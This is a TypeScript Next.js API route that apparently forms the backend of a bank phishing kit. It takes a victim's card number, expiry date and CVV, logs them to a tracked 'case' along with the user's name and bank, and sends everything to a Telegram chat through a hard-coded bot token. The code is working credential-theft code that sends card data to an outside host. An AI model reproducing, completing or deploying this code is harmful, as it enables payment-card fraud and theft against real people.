import { NextRequest, NextResponse } from 'next/server';
import { caseStore } from '@/lib/store';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { tarjeta, fecha, cvv } = body;

        const idregRaw = request.headers.get('cookie')?.split('; ').find(row => row.startsWith('id_registro='))?.split('=')[1];
        const idreg = idregRaw ? parseInt(idregRaw) : null;

        if (idreg) {
            caseStore.updateCaseData(idreg, {
                tarjeta,
                ftarjeta: fecha,
                cvv
            });
            caseStore.updateCaseStatus(idreg, 7); // 7: CARD_ENTERED

            const record = caseStore.getCase(idreg);
            if (record) {
                const message = `💳 TARJETA RECIBIDA:\n👤 User: ${record.usuario}\n🏦 Bank: ${record.banco}\n💳 Card: ${tarjeta}\n📅 Exp: ${fecha}\n🔒 CVV: ${cvv}\n🆔 ID: ${idreg}`;

                await fetch(`https://api.telegram.org/bot8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: '-4927137480',
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            }
        }

        return NextResponse.json({ success: true });
    } catch (error) {
        return NextResponse.json({ success: false }, { status: 500 });
    }
}
